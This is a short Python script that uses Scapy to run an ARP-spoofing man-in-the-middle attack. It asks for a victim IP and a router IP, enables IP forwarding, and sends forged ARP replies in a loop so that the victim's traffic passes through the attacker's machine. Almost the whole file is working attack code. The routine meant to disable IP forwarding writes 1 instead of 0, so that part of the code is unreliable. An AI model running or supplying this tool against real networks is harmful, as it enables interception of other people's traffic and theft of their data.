import os
import time
import sys
from scapy.all import *

def getInfo():
	print("~~~Getting addresses...")
	interface = raw_input("Interface:")
	victimIP = raw_input("Victim IP:")
	routerIP = raw_input("Router IP:")
	return [interface, victimIP, routerIP]

def setIPForwarding(toggle):
	if(toggle == True):
		print("~~~Turing on IP forwarding...")
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	if(toggle == False):
		print("~~~Turing off IP forwarding...")
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def get_MAC(ip, interface):
	
	# srp() send/recive packets at layer 2 (ARP)
	answer, unanswer = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1)

	for send,recieve in answer:
		return recieve.sprintf(r"%Ether.src%")

def reassignARP(victimIP, routerIP, interface):
	print("~~~Reassigning ARPS...")

	victimMAC = get_MAC(victimIP, interface)
	
	routerMAC = get_MAC(routerIP, interface)

	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7))

	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))

	setIPForwarding(False)

def attack(victimIP, victimMAC, routerIP, routerMAC):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def manInTheMiddle():

	info = getInfo()
	setIPForwarding(True)

	print("~~~Getting MACs...")
	try:
		victimMAC = get_MAC(info[1], info[0])
	except Exception, e:
		setIPForwarding(False)
		print("~!~Error getting victim MAC...")
		print(e)
		sys.exit(1)

	try:
		routerMAC = get_MAC(info[2], info[0])
	except Exception, e:
		setIPForwarding(False)
		print("~!~Error getting router MAC...")
		print(e)
		sys.exit(1)

	print("~~~Victim MAC: %s" % victimMAC)
	print("~~~Router MAC: %s" % routerMAC)
	print("~~~Attacking...")

	while True:
		try:
			attack(info[1], victimMAC, info[2], routerMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reassignARP(info[1], info[2], info[0])
			break
	sys.exit(1)

manInTheMiddle()
